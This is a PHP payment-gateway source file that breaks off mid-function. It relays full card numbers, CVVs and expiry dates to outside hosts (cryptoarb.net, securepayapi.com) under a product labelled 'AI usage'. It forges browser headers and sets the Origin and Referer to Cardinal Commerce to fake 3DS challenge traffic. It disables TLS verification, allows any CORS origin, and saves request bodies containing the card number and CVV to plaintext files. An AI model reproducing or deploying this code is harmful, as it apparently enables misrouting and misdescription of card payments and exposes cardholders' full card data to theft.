<?php
ini_set('log_errors', 1);
ini_set('error_log', __DIR__ . '/debug.log');

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type, Authorization');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

class PaymentProcessor {
    private $customer = 'P3653E62';  // Default fallback
    private $co = 'al';
    private $product = '100';
    private $productDescription = 'AI usage';
    private $country = 'PL';
    public $paymentId = null;  // ✅ Сделано публичным для доступа из catch блока
    
    public function __construct($paymentId = null, $customCustomer = null) {
        $this->paymentId = $paymentId;
        
        // ✅ НОВОЕ: Если передан custom customer, используем его
        if ($customCustomer) {
            $this->customer = $customCustomer;
            error_log("Using custom customer from URL: " . $this->customer);
        }
        
        // If payment ID is provided, get settings from main API
        if ($paymentId) {
            $this->loadPaymentSettings($paymentId, $customCustomer);
        }
    }
    
    private function loadPaymentSettings($paymentId, $customCustomer = null) {
        try {
            error_log("Loading payment settings for payment ID: $paymentId");
            
            // Get payment data and gateway settings from main API
            $paymentData = $this->getPaymentFromMainAPI($paymentId);
            
            if ($paymentData && isset($paymentData['shop']['gatewaySettings'])) {
                $gatewaySettings = json_decode($paymentData['shop']['gatewaySettings'], true);
                
                if (isset($gatewaySettings['amer'])) {
                    $amerSettings = $gatewaySettings['amer'];
                    
                    // Update settings from gateway configuration
                    // ✅ ИЗМЕНЕНО: Приоритет customCustomer > настройки > дефолт
                    if ($customCustomer) {
                        $this->customer = $customCustomer;
                        error_log("Using custom customer from URL (priority): " . $this->customer);
                    } elseif (isset($amerSettings['customer'])) {
                        $this->customer = $amerSettings['customer'];
                        error_log("Using customer from settings: " . $this->customer);
                    }
                    
                    if (isset($amerSettings['co'])) {
                        $this->co = $amerSettings['co'];
                    }
                    
                    if (isset($amerSettings['product'])) {
                        $this->product = $amerSettings['product'];
                    }
                    
                    if (isset($amerSettings['country'])) {
                        $this->country = $amerSettings['country'];
                    }
                    
                    error_log("Amer settings loaded: customer={$this->customer}, co={$this->co}, product={$this->product}");
                }
            }
        } catch (Exception $e) {
            error_log("Error loading payment settings: " . $e->getMessage());
            // Continue with default settings
        }
    }
    
    private function getPaymentFromMainAPI($paymentId) {
        $url = "https://api.trapay.uk/api/internal/payments/$paymentId/gateway-settings";
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'Authorization: Bearer internal-api-key',  // Add internal API key
                'User-Agent: AmerGateway/1.0'
            ]
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        if ($error) {
            error_log("API request error: $error");
            return null;
        }
        
        if ($httpCode !== 200) {
            error_log("API request failed with HTTP code: $httpCode");
            return null;
        }
        
        $data = json_decode($response, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            error_log("Invalid JSON response from API");
            return null;
        }
        
        return $data;
    }
    
    public function updatePaymentInMainDB($paymentId, $updateData) {
        $url = "https://api.trapay.uk/api/internal/payments/$paymentId/update";
        
        error_log("🔄 UPDATING PAYMENT IN MAIN DB:");
        error_log("Payment ID: $paymentId");
        error_log("Update URL: $url");
        error_log("Update data: " . json_encode($updateData));
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_CUSTOMREQUEST => 'PATCH',
            CURLOPT_POSTFIELDS => json_encode($updateData),
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/json',
                'Authorization: Bearer internal-api-key',  // Add internal API key
                'User-Agent: AmerGateway/1.0'
            ]
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        error_log("📡 UPDATE RESPONSE:");
        error_log("HTTP Code: $httpCode");
        error_log("Response: $response");
        if ($error) {
            error_log("cURL Error: $error");
        }
        
        if ($error) {
            error_log("❌ Payment update error: $error");
            return false;
        }
        
        if ($httpCode !== 200) {
            error_log("❌ Payment update failed with HTTP code: $httpCode");
            error_log("❌ Response body: $response");
            return false;
        }
        
        error_log("✅ Payment $paymentId updated successfully");
        return true;
    }
    
    public function processPayment($paymentData) {
        try {
            // Step 1: Get fees information
            $feesData = $this->getFees($paymentData);
            if (!$feesData) {
                throw new Exception('Failed to get fees information');
            }
            
            // Step 2: Prepare and send main payment request
            $paymentRequest = $this->preparePaymentRequest($paymentData, $feesData);
            $result = $this->sendPaymentRequest($paymentRequest);
            
            // Debug log
            error_log('Payment result: ' . json_encode($result));
            
            // Check if result contains 3DS challenge - даже если запрос успешный
            if ($this->is3DSChallenge($result)) {
                error_log('3DS Challenge detected by is3DSChallenge()');
                return $this->handle3DSChallenge($result, $paymentData);
            }
            
            // Check if the API response itself indicates 3DS requirement
            if (is_array($result) && isset($result['outcome']) && $result['outcome'] === 'initialized') {
                error_log('3DS Challenge detected by outcome check');
                return $this->handle3DSChallenge($result, $paymentData);
            }
            
            error_log('No 3DS challenge detected, but payment not completed yet');
            
            // If no 3DS challenge, this means the payment initialization succeeded
            // but we still need to check if payment was actually processed
            // This should not happen in normal flow - we expect either 3DS or immediate success with order ID
            
            return [
                'success' => false,
                'message' => 'Payment initialization completed but no 3DS challenge received - status unclear',
                'requires_verification' => true,
                'result' => $result,
                'fees' => $feesData
            ];
            
        } catch (Exception $e) {
            // ✅ НОВОЕ: Сохраняем cardLast4 даже при ошибке, если paymentId доступен
            if ($this->paymentId && isset($paymentData['cardNumber'])) {
                $this->updatePaymentInMainDB($this->paymentId, [
                    'cardLast4' => substr(str_replace(' ', '', $paymentData['cardNumber']), -4),
                    'paymentMethod' => 'card',
                    'status' => 'FAILED',
                    'failureMessage' => json_encode([
                        'error' => $e->getMessage(),
                        'step' => 'payment_processing',
                        'timestamp' => date('Y-m-d H:i:s')
                    ])
                ]);
                error_log('✅ Saved cardLast4 for payment ' . $this->paymentId . ' on error');
            }
            
            return [
                'success' => false,
                'message' => $e->getMessage()
            ];
        }
    }
    
    private function getFees($paymentData) {
        $feesPayload = json_encode([
            'amount' => $paymentData['amount'],
            'processor' => 'worldpay',
            'customer' => $this->customer,
            'currency' => $paymentData['currency'],
            'cc' => str_replace(' ', '', $paymentData['cardNumber'])
        ]);
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://cryptoarb.net:2053/fees',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $feesPayload,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'Accept: */*',
                'Cache-Control: no-cache',
                'Pragma: no-cache',
                'X-Requested-With: XMLHttpRequest',
                'Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                'Sec-Ch-Ua-Mobile: ?0',
                'Sec-Ch-Ua-Platform: "Windows"',
                'Sec-Fetch-Dest: empty',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Site: same-origin'
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        // Save fees API response
        $this->saveApiResponse('fees', [
            'request' => json_decode($feesPayload, true),
            'response' => $response,
            'http_code' => $httpCode,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        
        if ($httpCode !== 200 || !$response) {
            error_log("Fees API error: HTTP $httpCode, Response: $response");
            return null;
        }
        
        return json_decode($response, true);
    }
    
    private function preparePaymentRequest($paymentData, $feesData) {
        $usdc = isset($feesData['usdc']) ? $feesData['usdc'] : 0;
        $balance = isset($feesData['balance']) ? $feesData['balance'] : 0;
        $fee = isset($feesData['fee']) ? $feesData['fee'] : ['base' => 0.2, 'percent' => 0.051];
        
        // Use country from fees response if available, otherwise fall back to default
        $country = 'PL'; // Force MD as requested
        
        $usdcFormatted = number_format($usdc, 2) . ' (' . 
                        number_format($fee['base'], 1) . ' + ' . 
                        number_format($fee['percent'] * 100, 2) . '%)';
        
        $poolFormatted = number_format($balance, 2) . ' available';
        
        return [
            'customer' => $this->customer,
            'co' => $this->co,
            'product' => $this->product,
            'productdescription' => $this->productDescription,
            'cc' => str_replace(' ', '', $paymentData['cardNumber']),
            'cvv' => $paymentData['cvv'],
            'expmo' => str_pad($paymentData['expiryMonth'], 2, '0', STR_PAD_LEFT),
            'expyr' => $paymentData['expiryYear'],
            'cardholder' => $paymentData['cardholderName'],
            'address' => '',
            'city' => '',
            'zip' => '',
            'country' => $country,
            'amount' => $paymentData['amount'],
            'currency' => $paymentData['currency'],
            'usdc' => $usdcFormatted,
            'pool' => $poolFormatted,
            'undefined' => 'Buy'
        ];
    }
    
    private function sendPaymentRequest($paymentRequest) {
        $payload = json_encode($paymentRequest);
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://cryptoarb.net:2053/wp3dsinit',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'Accept: */*',
                'Cache-Control: no-cache',
                'Pragma: no-cache',
                'X-Requested-With: XMLHttpRequest',
                'Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138", "Google Chrome";v="138"',
                'Sec-Ch-Ua-Mobile: ?0',
                'Sec-Ch-Ua-Platform: "Windows"',
                'Sec-Fetch-Dest: empty',
                'Sec-Fetch-Mode: cors',
                'Sec-Fetch-Site: same-origin'
            ],
            CURLOPT_TIMEOUT => 30,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0, // ✅ ДОБАВЛЕНО: HTTP/2
            CURLOPT_ENCODING => '', // ✅ ДОБАВЛЕНО: Автоматическое декодирование
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        curl_close($ch);
        
        // Save payment API response
        $this->saveApiResponse('payment', [
            'request' => json_decode($payload, true),
            'response' => $response,
            'http_code' => $httpCode,
            'curl_error' => $error,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        
        if ($error) {
            throw new Exception('cURL error: ' . $error);
        }
        
        if ($httpCode !== 200) {
            throw new Exception('Payment API error: HTTP ' . $httpCode);
        }
        
        $result = json_decode($response, true);
        if (json_last_error() !== JSON_ERROR_NONE) {
            throw new Exception('Invalid JSON response from payment API');
        }
        
        return $result;
    }
    
    public function logPayment($paymentData, $result) {
        $logData = [
            'timestamp' => date('Y-m-d H:i:s'),
            'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
            'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown',
            'payment_data' => [
                'amount' => $paymentData['amount'],
                'currency' => $paymentData['currency'],
                'cardholder' => $paymentData['cardholderName'],
                'cardLast4' => substr(str_replace(' ', '', $paymentData['cardNumber']), -4)
            ],
            'result' => $result
        ];
        
        $logFile = 'logs/payments_' . date('Y-m-d') . '.log';
        if (!file_exists('logs')) {
            mkdir('logs', 0755, true);
        }
        
        file_put_contents($logFile, json_encode($logData) . "\n", FILE_APPEND | LOCK_EX);
    }
    
    private function saveApiResponse($type, $data) {
        $responseDir = 'responses';
        if (!file_exists($responseDir)) {
            mkdir($responseDir, 0755, true);
        }
        
        $filename = $responseDir . '/' . $type . '_' . date('Y-m-d_H-i-s') . '_' . uniqid() . '.json';
        file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        
        // Also save to daily summary file
        $summaryFile = $responseDir . '/' . $type . '_responses_' . date('Y-m-d') . '.log';
        $summaryData = [
            'timestamp' => $data['timestamp'],
            'http_code' => $data['http_code'],
            'response_length' => strlen($data['response']),
            'file' => $filename
        ];
        file_put_contents($summaryFile, json_encode($summaryData) . "\n", FILE_APPEND | LOCK_EX);
    }
    
    private function is3DSChallenge($result) {
        error_log('Checking for 3DS challenge in result: ' . json_encode($result));
        
        // Check if the response contains 3DS challenge indicators
        if (is_string($result)) {
            $has3DS = (strpos($result, 'challenge3ds') !== false || 
                      strpos($result, '3dsecure') !== false ||
                      strpos($result, 'iframe') !== false);
            error_log('String check for 3DS: ' . ($has3DS ? 'true' : 'false'));
            return $has3DS;
        }
        
        if (is_array($result)) {
            // Check for device data collection (first step of 3DS)
            if (isset($result['outcome']) && $result['outcome'] === 'initialized' && 
                isset($result['deviceDataCollection'])) {
                error_log('Found device data collection in result');
                return true;
            }
            
            // Check for traditional 3DS challenge
            $has3DS = (isset($result['challenge']) || 
                      isset($result['iframe']) ||
                      isset($result['redirect_url']) ||
                      (isset($result['status']) && $result['status'] === '3ds_required'));
            
            error_log('Array check for 3DS: ' . ($has3DS ? 'true' : 'false'));
            return $has3DS;
        }
        
        error_log('No 3DS indicators found');
        return false;
    }
    
    private function handle3DSChallenge($result, $paymentData) {
        // Extract 3DS parameters from the result
        $challengeData = $this->extract3DSParams($result);
        
        // ✅ НОВОЕ: Сохраняем cardLast4 сразу при начале 3DS процесса
        if ($this->paymentId) {
            $this->updatePaymentInMainDB($this->paymentId, [
                'cardLast4' => substr(str_replace(' ', '', $paymentData['cardNumber']), -4),
                'paymentMethod' => 'card'
            ]);
            error_log('✅ Saved cardLast4 for payment ' . $this->paymentId . ' at 3DS start');
        }
        
        // If this is device data collection, return data for frontend processing
        if (isset($challengeData['outcome']) && $challengeData['outcome'] === 'initialized' && 
            isset($challengeData['jwt']) && isset($challengeData['url'])) {
            
            error_log('Device data collection required - returning data for frontend');
            
            // Save DDC challenge data
            $this->saveApiResponse('3ds_ddc_challenge', [
                'challenge_data' => $challengeData,
                'original_result' => $result,
                'payment_data' => [
                    'amount' => $paymentData['amount'],
                    'currency' => $paymentData['currency'],
                    'cardLast4' => substr(str_replace(' ', '', $paymentData['cardNumber']), -4)
                ],
                'timestamp' => date('Y-m-d H:i:s')
            ]);
            
            return [
                'success' => false,
                'requires_3ds' => true,
                'requires_ddc' => true,
                'message' => '3D Secure device data collection required',
                'ddc_url' => $this->build3DSUrl($challengeData),
                'ddc_params' => [
                    'url' => $challengeData['url'],
                    'jwt' => $challengeData['jwt'],
                    'bin' => $challengeData['bin'],
                    'refid' => $challengeData['transactionReference'] ?? ''
                ],
                'challenge_data' => $challengeData,
                'transaction_id' => 'TXN3DS' . time() . rand(1000, 9999)
            ];
        }
        
        // Traditional 3DS challenge
        $this->saveApiResponse('3ds_challenge', [
            'challenge_data' => $challengeData,
            'original_result' => $result,
            'payment_data' => [
                'amount' => $paymentData['amount'],
                'currency' => $paymentData['currency'],
                'cardLast4' => substr(str_replace(' ', '', $paymentData['cardNumber']), -4)
            ],
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        
        return [
            'success' => false,
            'requires_3ds' => true,
            'message' => '3D Secure authentication required',
            'challenge_url' => $this->build3DSUrl($challengeData),
            'challenge_data' => $challengeData,
            'transaction_id' => 'TXN3DS' . time() . rand(1000, 9999)
        ];
    }
    
    
    private function extract3DSParams($result) {
        $params = [];
        
        if (is_string($result)) {
            // Parse iframe src from HTML string
            if (preg_match('/src="([^"]*)"/', $result, $matches)) {
                $src = html_entity_decode($matches[1]);
                
                // Parse URL parameters
                $parsed = parse_url($src);
                if (isset($parsed['query'])) {
                    parse_str($parsed['query'], $params);
                }
            }
        } elseif (is_array($result)) {
            // Handle device data collection response
            if (isset($result['deviceDataCollection'])) {
                $params = [
                    'jwt' => $result['deviceDataCollection']['jwt'],
                    'url' => $result['deviceDataCollection']['url'],
                    'bin' => $result['deviceDataCollection']['bin'] ?? '',
                    'transactionReference' => $result['transactionReference'] ?? '',
                    'outcome' => $result['outcome'] ?? ''
                ];
            } else {
                $params = $result;
            }
        }
        
        return $params;
    }
    
    public function processAuth($paymentData, $ddcData) {
        try {
            // Step 4: Send authentication request to wp3dsauth
            $authRequest = $this->prepareAuthRequest($paymentData, $ddcData);
            $result = $this->sendAuthRequest($authRequest);
            
            error_log('Auth result: ' . json_encode($result));
            
            // Check if we get 3DS challenge response
            if (isset($result['url']) && isset($result['jwt'])) {
                return [
                    'success' => false,
                    'requires_3ds_challenge' => true,
                    'message' => '3D Secure challenge required',
                    'challenge_url' => $result['url'],
                    'challenge_jwt' => $result['jwt'],
                    'challenge_payload' => $result['payload'] ?? '',
                    'challenge_md' => $result['md'] ?? '',
                    'reference' => $result['reference'] ?? '',
                    'transaction_id' => 'TXN3DS' . time() . rand(1000, 9999)
                ];
            }
            
            // Check for 3DS unavailable error
            if (isset($result['error']) && strpos($result['error'], '3dsecure authentication unavailable') !== false) {
                // Card doesn't support 3DS - this is NOT a successful payment, it's an error
                if ($this->paymentId) {
                    $this->updatePaymentInMainDB($this->paymentId, [
                        'status' => 'FAILED',
                        'failureMessage' => json_encode([
                            'error' => '3DS authentication unavailable for this card',
                            'step' => 'auth_processing',
                            'original_error' => $result['error'],
                            'timestamp' => date('Y-m-d H:i:s')
                        ])
                    ]);
                }
                
                throw new Exception('3DS authentication unavailable for this card type');
            }
            
            // Check for other errors
            if (isset($result['error'])) {
                throw new Exception($result['error']);
            }
            
            // If no challenge needed and no error, this is unexpected
            // At auth stage we should either get 3DS challenge or a real transaction ID
            if ($this->paymentId) {
                $this->updatePaymentInMainDB($this->paymentId, [
                    'status' => 'FAILED',
                    'failureMessage' => json_encode([
                        'error' => 'Unexpected auth response - no challenge and no transaction ID',
                        'step' => 'auth_processing',
                        'auth_result' => $result,
                        'timestamp' => date('Y-m-d H:i:s')
                    ])
                ]);
            }
            
            throw new Exception('Unexpected auth response: no challenge required but no transaction ID received');
            
        } catch (Exception $e) {
            error_log('Auth processing error: ' . $e->getMessage());
            
            // ✅ НОВОЕ: Обновляем статус платежа на FAILED при ошибке аутентификации
            if ($this->paymentId) {
                $this->updatePaymentInMainDB($this->paymentId, [
                    'status' => 'FAILED',
                    'failureMessage' => json_encode([
                        'error' => $e->getMessage(),
                        'step' => 'auth_processing',
                        'timestamp' => date('Y-m-d H:i:s')
                    ])
                ]);
                error_log('Updated payment ' . $this->paymentId . ' status to FAILED after auth error');
            }
            
            throw $e;
        }
    }
    
    public function process3DSVerification($requestData) {
        try {
            $transactionId = $requestData['transactionId'];
            $refid = $requestData['refid'];
            $customer = $requestData['customer'];
            $paymentData = $requestData['paymentData'];
            
            // Extract payment_id for database updates
            if (isset($paymentData['payment_id'])) {
                $this->paymentId = $paymentData['payment_id'];
                error_log('Using payment_id from request: ' . $this->paymentId);
                
                // ✅ НОВОЕ: Извлекаем custom customer из запроса, если передан
                $customCustomer = null;
                if (isset($paymentData['customer']) && !empty($paymentData['customer'])) {
                    $customCustomer = $paymentData['customer'];
                    error_log('Found custom customer in paymentData: ' . $customCustomer);
                }
                
                // ✅ Загружаем настройки платежа для получения корректного customer
                $this->loadPaymentSettings($this->paymentId, $customCustomer);
                error_log('Loaded settings - customer: ' . $this->customer . ', co: ' . $this->co . ', product: ' . $this->product);
            }
            
            error_log('🔍 3DS VERIFICATION DEBUG:');
            error_log('Starting 3DS verification for TransactionId: ' . $transactionId);
            error_log('Received refid: ' . $refid);
            error_log('Received customer: ' . $customer);
            error_log('Full request data: ' . json_encode($requestData));
            
            // Wait 2 seconds before processing 3DS verification
            error_log('Waiting 2 seconds before 3DS verification...');
            sleep(2);
            
            // Step 1: Send challenge request to securepayapi.com
            error_log('Step 1: Sending challenge request to securepayapi.com');
            error_log('Challenge TransactionId: ' . $transactionId);
            
            try {
                $challengeResult = $this->sendChallengeRequest($transactionId);
                error_log('✅ Challenge request completed successfully');
                error_log('Challenge result length: ' . strlen($challengeResult));
            } catch (Exception $e) {
                error_log('❌ Challenge request failed: ' . $e->getMessage());
                // Continue anyway - maybe it's not critical
            }
            
            // Step 2: Verify with cryptoarb.net
            error_log('Step 2: Sending verification request');
            
            $verifyData = [
                'refid' => $refid,
                'challengeref' => $transactionId,
                'customer' => $this->customer, // ✅ Используем customer из настроек платежа
            ];
            
            error_log('🔍 VERIFY REQUEST DATA:');
            error_log('refid: ' . $refid . ' (length: ' . strlen($refid) . ')');
            error_log('challengeref: ' . $transactionId . ' (length: ' . strlen($transactionId) . ')');
            error_log('customer from settings: ' . $this->customer); // ✅ Показываем customer из настроек
            error_log('customer from request: ' . $customer); // ✅ Показываем customer из запроса для сравнения
            error_log('Full verify data: ' . json_encode($verifyData));
            
            $verifyResult = $this->send3DSVerifyRequest($verifyData);
            
            error_log('🔍 VERIFY RESULT DEBUG:');
            error_log('Raw verifyResult: ' . json_encode($verifyResult));
            error_log('verifyResult type: ' . gettype($verifyResult));
            error_log('verifyResult is null: ' . ($verifyResult === null ? 'true' : 'false'));
            
            if (!$verifyResult) {
                error_log('❌ verifyResult is empty/null/false');
                throw new Exception('3DS verification failed: verify request returned empty response');
            }
            
            if (!isset($verifyResult['outcome'])) {
                error_log('❌ Missing outcome in verifyResult: ' . json_encode($verifyResult));
                throw new Exception('3DS verification failed: missing outcome in response - ' . json_encode($verifyResult));
            }
            
            if ($verifyResult['outcome'] !== 'authenticated') {
                error_log('❌ Outcome not authenticated: ' . $verifyResult['outcome']);
                throw new Exception('3DS verification failed: outcome=' . $verifyResult['outcome'] . ', full response: ' . json_encode($verifyResult));
            }
            
            if (!isset($verifyResult['authentication'])) {
                throw new Exception('Missing authentication data in verify response');
            }
            
            // Step 3: Final payment with 3DS auth data
            error_log('Step 3: Sending final payment request');
            $finalPaymentData = [
                'refid' => $refid,
                'challengeref' => $transactionId,
                'customer' => $this->customer, // ✅ Используем customer из настроек платежа
                'co' => $this->co,
                'product' => $this->product,
                'productdescription' => $this->productDescription,
                'cc' => str_replace(' ', '', $paymentData['cardNumber']),
                'cvv' => $paymentData['cvv'],
                'expmo' => str_pad($paymentData['expiryMonth'], 2, '0', STR_PAD_LEFT),
                'expyr' => $paymentData['expiryYear'],
                'cardholder' => $paymentData['cardholderName'],
                'address' => '',
                'city' => '',
                'zip' => '',
                'country' => 'PL',
                'amount' => $paymentData['amount'],
                'currency' => $paymentData['currency'],
                'usdc' => number_format(floatval($paymentData['amount']) * 0.93, 2) . ' (0.2 + 5.09%)',
                'pool' => '6121.27 available',
                'auth3ds' => $verifyResult['authentication']
            ];
            
            $finalResult = $this->sendFinalPaymentRequest($finalPaymentData);
            
            if (!$finalResult || !isset($finalResult['order'])) {
                throw new Exception('Final payment failed: ' . json_encode($finalResult));
            }
            
            // ✅ НОВОЕ: Обновляем платеж в основной БД после успеха
            if ($this->paymentId) {
                $this->updatePaymentInMainDB($this->paymentId, [
                    'status' => 'PAID',
                    'gatewayPaymentId' => $finalResult['order'],
                    'cardLast4' => substr(str_replace(' ', '', $paymentData['cardNumber']), -4),
                    'paymentMethod' => 'card',
                    'paidAt' => date('Y-m-d H:i:s'),
                    'failureMessage' => json_encode($finalResult)
                ]);
            }
            
            return [
                'success' => true,
                'order' => $finalResult['order'],
                'message' => $finalResult['response'] ?? 'Payment completed successfully',
                'paymentId' => $this->paymentId
            ];
            
        } catch (Exception $e) {
            error_log('3DS verification error: ' . $e->getMessage());
            
            // ✅ НОВОЕ: Обновляем статус платежа на FAILED при ошибке
            if ($this->paymentId) {
                $this->updatePaymentInMainDB($this->paymentId, [
                    'status' => 'FAILED',
                    'failureMessage' => json_encode([
                        'error' => $e->getMessage(),
                        'step' => '3ds_verification',
                        'timestamp' => date('Y-m-d H:i:s')
                    ])
                ]);
                error_log('Updated payment ' . $this->paymentId . ' status to FAILED');
            }
            
            return [
                'success' => false,
                'message' => $e->getMessage(),
                'paymentId' => $this->paymentId
            ];
        }
    }
    
    private function sendChallengeRequest($transactionId) {
        $url = 'https://securepayapi.com:2087/wp3dschallenge';
        $postData = 'TransactionId=' . urlencode($transactionId) . '&Response=&MD=';
        
        error_log('🔍 CHALLENGE REQUEST DEBUG:');
        error_log('Challenge Request - URL: ' . $url);
        error_log('Challenge Request - Body: ' . $postData);
        error_log('TransactionId: ' . $transactionId);
        error_log('Data length: ' . strlen($postData));
        
        // Точные заголовки из рабочего запроса
        $headers = [
            'Content-Length: ' . strlen($postData),
            'Cache-Control: max-age=0',
            'Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"',
            'Sec-Ch-Ua-Mobile: ?0',
            'Sec-Ch-Ua-Platform: "Windows"',
            'Accept-Language: ru-RU,ru;q=0.9',
            'Origin: https://centinelapi.cardinalcommerce.com',
            'Content-Type: application/x-www-form-urlencoded',
            'Upgrade-Insecure-Requests: 1',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Sec-Fetch-Site: cross-site',
            'Sec-Fetch-Mode: navigate',
            'Sec-Fetch-Dest: iframe',
            'Sec-Fetch-Storage-Access: active',
            'Referer: https://centinelapi.cardinalcommerce.com/',
            'Accept-Encoding: gzip, deflate, br',
            'Priority: u=0, i',
            'Connection: keep-alive'
        ];
        
        error_log('Challenge Request Headers:');
        foreach ($headers as $header) {
            error_log('  ' . $header);
        }
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $postData,
            CURLOPT_HTTPHEADER => $headers,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
            CURLOPT_TIMEOUT => 30,
            CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_2_0, // ✅ ИЗМЕНЕНО: Принудительно HTTP/2
            CURLOPT_ENCODING => '', // ✅ ДОБАВЛЕНО: Автоматическое декодирование gzip/deflate
        ]);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        $error = curl_error($ch);
        $httpVersion = curl_getinfo($ch, CURLINFO_HTTP_VERSION);
        
        curl_close($ch);
        
        // ✅ ДОБАВЛЕНО: Детальная отладка ответа
        error_log('🔍 CHALLENGE RESPONSE DEBUG:');
        error_log('HTTP Code: ' . $httpCode);
        error_log('HTTP Version: ' . $httpVersion);
        error_log('cURL Error: ' . $error);
        error_log('Response length: ' . strlen($response));
        error_log('Response first 100 bytes as hex: ' . bin2hex(substr($response, 0, 100)));
        
        // ✅ ДОБАВЛЕНО: Попытка ручного декодирования если автоматическое не сработало
        if (!empty($response) && strpos($response, '<html>') === false && !is_string($response)) {
            // Проверяем gzip
            if (substr($response, 0, 2) === "\x1f\x8b") {
                error_log('🔧 Detected gzip encoding, manually decoding...');
                $decodedResponse = gzdecode($response);
                if ($decodedResponse !== false) {
                    $response = $decodedResponse;
                    error_log('✅ Successfully decoded gzip response');
                } else {
                    error_log('❌ Failed to decode gzip response');
                }
            }
            // Проверяем deflate
            else if (substr($response, 0, 2) === "\x78") {
                error_log('🔧 Detected deflate encoding, manually decoding...');
                $decodedResponse = gzinflate($response);
                if ($decodedResponse !== false) {
                    $response = $decodedResponse;
                    error_log('✅ Successfully decoded deflate response');
                } else {
                    error_log('❌ Failed to decode deflate response');
                }
            }
        }
        
        error_log('Raw response (first 200 chars): ' . substr($response, 0, 200));
        
        // Проверим что это HTML
        if (strpos($response, '<html>') !== false) {
            error_log('✅ Received HTML response as expected');
        } else {
            error_log('❌ Response is not HTML: ' . substr($response, 0, 100));
        }
        
        // Save to file
        $this->saveApiResponse('challenge_request', [
            'url' => $url,
            'request_body' => $postData,
            'response' => $response,
            'http_code' => $httpCode,
            'http_version' => $httpVersion,
            'error' => $error,
            'timestamp' => date('Y-m-d H:i:s')
        ]);
        
        if ($error) {
            throw new Exception('Challenge request failed: ' . $error);
        }
        
        if ($httpCode !== 200) {
            throw new Exception('Challenge request failed with HTTP code: ' . $httpCode);
        }
        
        return $response;
    }
    
    
    private function send3DSVerifyRequest($verifyData) {
        $jsonBody = json_encode($verifyData);
        
        error_log('3DS Verify Request - URL: https://cryptoarb.net:2053/wp3dsverify');
        error_log('3DS Verify Request - Body: ' . $jsonBody);
        
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => 'https://cryptoarb.net:2053/wp3dsverify',
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $jsonBody,
            CURLOPT_HTTPHEADER => [
                'Content-Type: application/x-www-form-urlencoded; charset=UTF-8',
                'Content-Length: ' . strlen($jsonBody),
                'Sec-Ch-Ua-Platform: "Windows"',
                'Accept-Language: ru-RU,ru;q=0.9',
                'Sec-Ch-Ua: "Not)A;Brand";v="8", "Chromium";v="138"',
                'Sec-Ch-Ua-Mobile: ?0',
                'X-Requested-With: XMLHttpRequest',
